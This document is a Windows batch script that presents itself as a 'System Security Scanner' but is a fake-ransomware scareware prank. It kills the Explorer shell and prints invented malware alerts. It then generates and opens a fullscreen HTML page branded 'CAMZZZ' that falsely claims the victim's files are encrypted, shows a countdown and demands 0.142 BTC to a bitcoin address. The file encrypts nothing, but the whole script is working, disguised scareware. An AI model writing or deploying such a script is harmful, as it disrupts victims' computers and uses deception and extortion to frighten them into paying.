@echo off
title System Security Scanner
color 0a
mode con: cols=80 lines=25

echo Initializing system security protocols...
timeout /t 2 >nul

taskkill /f /im explorer.exe >nul 2>&1

color 2
pause

echo [WARNING] Multiple threats detected in system memory!
timeout /t 2 >nul
echo [ALERT] Firewall breach confirmed!
timeout /t 2 >nul
echo [CRITICAL] System32 corruption detected!
pause

echo.
echo Attempting emergency system recovery...
timeout /t 3 >nul
echo [FAILED] Recovery unsuccessful!
timeout /t 2 >nul
echo [FATAL] Critical system files compromised!
pause

echo.
echo Malware signatures found:
echo - Trojan.Generic.45XX
echo - Worm.Win32.AutoRun
echo - Rootkit.Boot.Master
timeout /t 3 >nul

echo.
echo Initiating deep system scan...
for /l %%i in (1,1,20) do (
    echo Scanning directory %%i/20...
    dir /s >nul 2>&1
    timeout /t 1 >nul
)

echo.
echo [ERROR] System integrity compromised beyond repair!
pause

set "htmlFile=%temp%\camszzz_final.html"

(
echo ^<!DOCTYPE html^>
echo ^<html lang="en"^>
echo ^<head^>
echo ^<meta charset="UTF-8"^>
echo ^<meta name="viewport" content="width=device-width, initial-scale=1.0"^>
echo ^<title^>CAMZZZ // DECRYPTION PANEL^</title^>
echo ^<style^>
echo @import url('https://fonts.googleapis.com/css2?family=VT323^&family=Share+Tech+Mono^&family=Fira+Code^&display=swap');
echo * { margin: 0; padding: 0; box-sizing: border-box; cursor: crosshair; }
echo html, body { width: 100%%; height: 100%%; overflow: hidden; background: #000; color: #fff; font-family: 'Share Tech Mono', monospace; }
echo body { display: flex; justify-content: center; align-items: center; position: relative; filter: sepia(0.2^) saturate(1.2^) contrast(1.1^); }
echo body::before { content: ""; position: fixed; inset: 0; background: linear-gradient(rgba(255,255,255,0.01^) 50%%, rgba(0,0,0,0.1^) 50%%^), linear-gradient(90deg, rgba(255,255,255,0.01^), rgba(0,0,0,0.01^)^); background-size: 100%% 4px, 4px 100%%; pointer-events: none; z-index: 100; }
echo body::after { content: ""; position: fixed; inset: 0; background: radial-gradient(circle, transparent 60%%, rgba(0,0,0,0.8^) 100%%^); pointer-events: none; z-index: 99; }
echo .container { width: 95%%; max-width: 1200px; height: 92vh; background: rgba(10,10,10,0.98^); border: 1px solid #333; box-shadow: 0 0 50px rgba(255,255,255,0.05^); display: grid; grid-template-columns: 350px 1fr; overflow: hidden; position: relative; animation: bootIn 0.5s ease-out; }
echo @keyframes bootIn { from { opacity: 0; transform: scale(0.9^) translateY(20px^); } to { opacity: 1; transform: scale(1^) translateY(0^); } }
echo .sidebar { border-right: 1px solid #222; background: #050505; padding: 40px; display: flex; flex-direction: column; align-items: center; }
echo .mask-logo { width: 220px; height: 220px; background-image: url('https://upload.wikimedia.org/wikipedia/commons/thumb/0/04/Masque_de_Guy_Fawkes_arbor%%C3%%A9_par_V.svg/500px-Masque_de_Guy_Fawkes_arbor%%C3%%A9_par_V.svg.png'^); background-size: contain; background-repeat: no-repeat; background-position: center; filter: grayscale(1^) brightness(0.8^) contrast(1.2^); animation: glitchMask 4s infinite; margin-bottom: 20px; }
echo @keyframes glitchMask { 0%%, 100%% { transform: translate(0^); filter: grayscale(1^) brightness(0.8^); } 1%% { transform: translate(-2px, 2px^); filter: grayscale(1^) brightness(1.2^) sepia(1^) hue-rotate(100deg^); } 2%% { transform: translate(2px, -2px^); filter: grayscale(0^) brightness(1^); } 3%% { transform: translate(0^); filter: grayscale(1^) brightness(0.8^); } }
echo .brand { text-align: center; font-size: 48px; letter-spacing: 8px; font-family: 'VT323', monospace; color: #fff; }
echo .brand-sub { text-align: center; color: #888; margin-top: 5px; font-size: 13px; letter-spacing: 4px; text-transform: uppercase; }
echo .status-box { margin-top: 50px; width: 100%%; border: 1px solid #222; padding: 20px; background: #000; }
echo .status-line { display: flex; justify-content: space-between; margin-bottom: 15px; font-size: 14px; color: #aaa; }
echo .status-dot { width: 10px; height: 10px; border-radius: 50%%; background: #fff; box-shadow: 0 0 5px #fff; margin-top: 4px; animation: pulse 1.5s infinite; }
echo @keyframes pulse { 0%% { opacity: 0.4; transform: scale(1^); } 50%% { opacity: 1; transform: scale(1.1^); } 100%% { opacity: 0.4; transform: scale(1^); } }
echo .main { padding: 50px; position: relative; overflow-y: auto; }
echo .warning-title { font-size: 56px; line-height: 1.1; letter-spacing: 2px; font-family: 'VT323', monospace; color: #fff; }
echo .timer-box { margin-top: 40px; background: #0a0a0a; border: 1px solid #222; padding: 30px; text-align: center; }
echo .timer-label { color: #888; letter-spacing: 4px; font-size: 13px; margin-bottom: 15px; text-transform: uppercase; }
echo #timer { font-size: 84px; font-family: 'VT323', monospace; letter-spacing: 8px; color: #fff; }
echo .terminal { margin-top: 40px; background: #000; border: 1px solid #222; height: 320px; overflow: hidden; padding: 20px; position: relative; font-family: 'Fira Code', monospace; }
echo .terminal-header { color: #666; margin-bottom: 15px; font-size: 14px; letter-spacing: 3px; text-transform: uppercase; }
echo .line { font-size: 13px; color: #8f8f8f; margin-bottom: 7px; opacity: 0; animation: fadeInLine 0.3s forwards; white-space: nowrap; }
echo @keyframes fadeInLine { to { opacity: 1; } }
echo .payment-box { margin-top: 40px; border: 1px dashed #444; padding: 25px; background: #050505; }
echo .payment-title { color: #999; margin-bottom: 15px; font-size: 14px; letter-spacing: 3px; text-transform: uppercase; }
echo .btc { font-size: 17px; word-break: break-all; color: #fff; background: #111; padding: 10px; border: 1px solid #333; user-select: all; }
echo .footer { position: absolute; bottom: 30px; right: 50px; color: #333; letter-spacing: 12px; font-size: 15px; text-transform: uppercase; }
echo .glitch-overlay { position: fixed; inset: 0; pointer-events: none; background: rgba(255,255,255,0.05^); opacity: 0; z-index: 110; }
echo ^</style^>
echo ^</head^>
echo ^<body^>
echo ^<div class="glitch-overlay" id="glitch"^>^</div^>
echo ^<div class="container"^>
echo     ^<div class="sidebar"^>
echo         ^<div class="mask-logo"^>^</div^>
echo         ^<div class="brand"^>CAMZZZ^</div^>
echo         ^<div class="brand-sub"^>You got hacked^</div^>
echo         ^<div class="status-box"^>
echo             ^<div class="status-line"^>^<span^>NETWORK STATUS^</span^>^<div class="status-dot"^>^</div^>^</div^>
echo             ^<div class="status-line"^>^<span^>FILES LOCKED^</span^>^<div class="status-dot"^>^</div^>^</div^>
echo             ^<div class="status-line"^>^<span^>BACKUPS DISCONNECTED^</span^>^<div class="status-dot"^>^</div^>^</div^>
echo             ^<div class="status-line"^>^<span^>REMOTE ACCESS^</span^>^<div class="status-dot"^>^</div^>^</div^>
echo             ^<div class="status-line"^>^<span^>TRACING DISABLED^</span^>^<div class="status-dot"^>^</div^>^</div^>
echo         ^</div^>
echo     ^</div^>
echo     ^<div class="main"^>
echo         ^<div class="warning-title"^>SYSTEM CRITICAL:^<br^>FILES ARE ENCRYPTED^</div^>
echo         ^<div class="timer-box"^>^<div class="timer-label"^>TIME UNTIL PRIVATE KEY DESTRUCTION^</div^>^<div id="timer"^>24:00:00^</div^>^</div^>
echo         ^<div class="terminal" id="terminal"^>^<div class="terminal-header"^>ENCRYPTION LOG // LIVE STREAM^</div^>^</div^>
echo         ^<div class="payment-box"^>^<div class="payment-title"^>SEND 0.142 BTC TO RECOVER ACCESS^</div^>^<div class="btc"^>bc1qcamszzzprankx9v3c4d8r6v5w2y8m1kqplm4sxt^</div^>^</div^>
echo         ^<div class="footer"^>SIGNED BY CAMSzzz^</div^>
echo     ^</div^>
echo ^</div^>
echo ^<script^>
echo const terminal = document.getElementById('terminal'^);
echo const glitch = document.getElementById('glitch'^);
echo const files = ['C:/Users/Admin/Documents/Tax_Return_2025.pdf','C:/Users/Admin/Desktop/Passwords.txt','C:/Users/Admin/Pictures/Private/Backup.zip','C:/Windows/System32/config/SAM','D:/Projects/Source/final_v3_core.php','C:/Users/Admin/AppData/Roaming/Wallet/wallet.dat','C:/Users/Admin/Documents/Contracts/NDA_confidential.docx','D:/Media/Family/Archive/video_2023.mp4','C:/Users/Admin/Work/Budget_Forecast_2026.xlsx','C:/Users/Admin/Cloud/backup.iso','C:/inetpub/wwwroot/web.config','C:/Users/Admin/Documents/Medical/records.xml'];
echo function addLine(^) { const div = document.createElement('div'^); div.className = 'line'; const file = files[Math.floor(Math.random(^)*files.length)]; const time = new Date(^).toLocaleTimeString('en-GB'^); div.textContent = '['+time+'] [ENCRYPTED] ' + file + '... DONE'; terminal.appendChild(div^); if (terminal.children.length ^> 19^) terminal.removeChild(terminal.children[1]^); terminal.scrollTop = terminal.scrollHeight; }
echo setInterval(addLine, 220^);
echo let seconds = 86400;
echo setInterval((^) =^> { let h = Math.floor(seconds / 3600^); let m = Math.floor((seconds %% 3600^)/60^); let s = seconds %% 60; document.getElementById('timer'^).textContent = h.toString(^).padStart(2,'0'^)+':'+m.toString(^).padStart(2,'0'^)+':'+s.toString(^).padStart(2,'0'^); if(seconds ^> 0^) seconds--; }, 1000^);
echo function triggerGlitch(^) { if (Math.random(^) ^> 0.8^) { glitch.style.opacity = '1'; setTimeout((^) =^> glitch.style.opacity = '0', 50^); setTimeout((^) =^> { glitch.style.opacity = '1'; }, 100^); setTimeout((^) =^> glitch.style.opacity = '0', 150^); } }
echo setInterval(triggerGlitch, 3000^);
echo ^</script^>
echo ^</body^>
echo ^</html^>
) > "%htmlFile%"

start "" "%htmlFile%"
timeout /t 2 >nul

echo Set WshShell = WScript.CreateObject("WScript.Shell") > "%temp%\fs.vbs"
echo WshShell.SendKeys "{F11}" >> "%temp%\fs.vbs"
cscript //nologo "%temp%\fs.vbs"
del "%temp%\fs.vbs"

exit

